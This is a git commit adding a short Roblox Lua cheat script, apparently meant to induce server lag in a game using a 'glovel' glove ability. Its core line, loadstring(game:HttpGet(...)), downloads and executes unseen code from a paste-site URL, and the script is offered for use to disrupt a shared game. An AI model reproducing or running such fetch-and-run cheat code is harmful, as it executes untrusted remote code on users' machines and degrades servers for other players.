3b95ce55aeed3fc84976c60a167bfbe1e80daab1
IMissYouSmile//BaiThaMa// <OMOHOTA@GMAIL.COM>
2024-08-24 11:15:38 +0700

    Create GlovelLagFake.lua

---
+++ GlovelLagFake.lua
@@ -0,0 +1,5 @@
+LagValue = 10000 --[[ Min: 1000, Max: 250000 (Value higher than 250k can make you crash ]]--
+AntiLag = true
+StartLag = true
+loadstring(game:HttpGet("https://pst.innomi.net/paste/uxy8fbhf52d8owcdy4gatmbk/raw"))()
+--[[Use glovel glove and use the ability before execute the script, to turn off Just active the ability glovel again]]--
